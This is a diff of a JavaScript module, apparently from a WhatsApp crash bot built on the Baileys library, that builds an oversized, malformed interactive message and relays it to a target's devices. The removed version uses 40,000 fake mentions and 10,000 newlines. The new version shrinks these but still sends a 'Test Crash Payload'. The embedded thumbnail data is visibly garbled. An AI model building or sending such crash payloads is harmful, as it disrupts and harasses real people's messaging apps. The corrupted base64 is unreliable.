@@ -1,33 +1,4 @@
 const { relayCrashToDevices } = require('../target-utils');
-/*
- * © 2026 SeXyxeon (VOIDSEC)
- *
- * ⚠️ COPYRIGHT NOTICE
- * This source code is protected under copyright law.
- * Any form of re-uploading, recoding, modification,
- * selling, or redistribution WITHOUT explicit permission
- * from the original author is strictly prohibited.
- *
- * ❌ NO CREDIT = NO PERMISSION
- * ❌ DO NOT CLAIM THIS CODE AS YOUR OWN
- *
- * ✔️ Usage or modification is allowed ONLY
- * with prior permission and proper credit.
- *
- * OFFICIAL LINKS (ONLY):
- * YouTube   : https://youtube.com/@voidsec7718
- * Instagram : sabir._7718
- * Telegram  : https://t.me/SABIR7718
- * GitHub    : https://github.com/SABIR7718
- * WhatsApp  : +91 73650 85213
- *
- * Violations may result in DMCA takedown
- * or termination of the Telegram bot.
- */
-
-const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require('@whiskeysockets/baileys');
-const pino = require('pino');
-const crypto = require('crypto');
 
 async function test(Aii, target) {
   let ApiNewFC;
@@ -39,7 +10,6 @@ async function test(Aii, target) {
       throw new Error(`HTTP ${res.status}`);
     }
   } catch (err) {
-    console.error("[test] error fetching ApiClient.json, using fallback:", err.message);
     ApiNewFC = JSON.stringify({
       status: true,
       criador: "Zuroku WA ApiClient",
@@ -47,7 +17,7 @@ async function test(Aii, target) {
     });
   }
 
-  const mentionedList = Array.from({ length: 40000 }, () => `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`);
+  const mentionedList = Array.from({ length: 300 }, () => `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`);
 
   const contextInfo = {
     mentionedJid: mentionedList,
@@ -58,7 +28,7 @@ async function test(Aii, target) {
     },
   };
 
-  const msg = await generateWAMessageFromContent(target, {
+  const msg = {
     viewOnceMessage: {
       message: {
         messageContextInfo: {
@@ -67,7 +37,7 @@ async function test(Aii, target) {
         },
         interactiveMessage: {
           body: {
-            text: ''
+            text: 'Test Crash Payload'
           },
           footer: {
             text: ''
@@ -88,7 +58,7 @@ async function test(Aii, target) {
                     fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                     directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                     mediaKeyTimestamp: "1749172037",
-                    jpegThumbnail: "/9j/4AAQSkZJRgABAQEASABIAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABAMDBAMDBAQDBAUEBAUGCgcGBgYGDQkKCAoPDRAQDw0PDhETGBQREhcSDg8VHBUXGRkbGxsQFB0fHRofGBobGv/bAEMBBAUFBgUGDAcHDBoRDxEaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGv/AABEIASwBLAMBIgACEQEDEQH/xAAcAAACAwEBAQEAAAAAAAAAAAACAwQGBwUBAAj/xABFEAABAwIDBQQGBwYFBAMBAAACAAEDBBIFESIGITJCUhMxQWIUUWFxcoIHFSOSorLCJDOBkdLwQ6HB4eI0c7HRFkRTY//EABsBAAIDAQEBA────────AAAAAABAgMEBQYHAAj/xABFEAABAwIDBQQGBwYFBAMBAAACAAEDBBIFESIGITJCUhMxQWIUUWFxcoIHFSOSorLCJDOBkdLwQ6HB4eI0c7HRFkRTY//EABsBAAIDAQEBA────────AAAAAABAgMEBQYHAAj/xABFEAABAwIDBQQGBwYFBAMBAAACAAEDBBIFESIGITJCUhMxQWIUUWFxcoIHFSOSorLCJDOBkdLwQ6HB4eI0c7HRFkRTY//EABsBAAIDAQEBA────────AAAAAABAgMEBQYHAAj/xABFEAABAwIDBQQGBwYFBAMBAAACAAEDBBIFESIGITJCUhMxQWIUUWFxcoIHFSOSorLCJDOBkdLwQ6HB4eI0c7HRFkRTY//EABsBAAIDAQEBA────────AAAAAABAgMEBQYHAAj",
+                    jpegThumbnail: "/9j/4AAQSkZJRgABAQEASABIAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABAMDBAMDBAQDBAUEBAUGCgcGBgYGDQkKCAoPDRAQDw0PDhETGBQREhcSDg8VHBUXGRkbGxsQFB0fHRofGBobGv/bAEMBBAUFBgUGDAcHDBoRDxEaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGv/AABEIASwBLAMBIgACEQEDEQH/xAAcAAACAwEBAQE────────AAAAAABAgMEBQYHAAj/xABFEAABAwIDBQQGBwYFBAMBAAACAAEDBBIFESIGITJCUhMxQWIUUWFxcoIHFSOSorLCJDOBkdLwQ6HB4eI0c7HRFkRTY//EABsBAAIDAQEBA────────AAAAAABAgMEBQYHAAj/xABFEAABAwIDBQQGBwYFBAMBAAACAAEDBBIFESIGITJCUhMxQWIUUWFxcoIHFSOSorLCJDOBkdLwQ6HB4eI0c7HRFkRTY//EABsBAAIDAQEBA────────AAAAAABAgMEBQYHAAj/xABFEAABAwIDBQQGBwYFBAMBAAACAAEDBBIFESIGITJCUhMxQWIUUWFxcoIHFSOSorLCJDOBkdLwQ6HB4eI0c7HRFkRTY//EABsBAAIDAQEBA────────AAAAAABAgMEBQYHAAj",
                     scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                     scanLengths: [8596, 155493]
                   },
@@ -101,7 +71,7 @@ async function test(Aii, target) {
                   text: "Vlorina.json"
                 },
                 nativeFlowMessage: {
-                  messageParamsJson: "\n".repeat(10000)
+                  messageParamsJson: JSON.stringify({ count: 1000 })
                 }
               }
             ]
@@ -124,11 +94,11 @@ async function test(Aii, target) {
                       nativeFlowMessage: {
                         buttons: [
                           {
-                            name : "single_select",
+                            name: "single_select",
                             buttonParamsJson: ApiNewFC + "",
                           },
                           {
-                            name : "call_permission_request",
+                            name: "call_permission_request",
                             buttonParamsJson: ApiNewFC + "\u0003",
                           },
                         ],
@@ -143,10 +113,9 @@ async function test(Aii, target) {
         }
       }
     }
-  },
-  {});
+  };
 
-  await relayCrashToDevices(Aii, target, msg.message);
+  return await relayCrashToDevices(Aii, target, msg);
 }
 
 module.exports = { test };
